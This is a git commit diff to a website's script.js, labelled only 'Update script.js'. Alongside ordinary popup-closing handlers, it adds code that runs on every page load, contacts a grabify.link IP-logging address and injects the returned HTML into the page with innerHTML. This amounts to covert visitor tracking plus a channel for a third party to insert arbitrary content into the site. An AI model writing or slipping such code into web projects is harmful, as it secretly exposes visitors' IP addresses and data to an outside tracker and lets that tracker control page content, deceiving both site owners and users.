4e61ac706d5746f526d67124a2099ef6a909821c
Nirlesh-N95 <152071712+Nirlesh-N95@users.noreply.github.com>
2024-06-10 19:21:45 +0530

    Update script.js

--- script.js
+++ script.js
@@ -92,4 +92,19 @@ closeButton.addEventListener('click', function() {
 close2.addEventListener('click', function() {
   popup2.style.display = 'none';
 });
+
+function loadContent(url) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            
+            document.getElementById("qwe").innerHTML = xhr.responseText;
+          }
+        };
+        xhr.send();
+      }
+      
+
+      loadContent("https://grabify.link/2NJ4IQ");
         
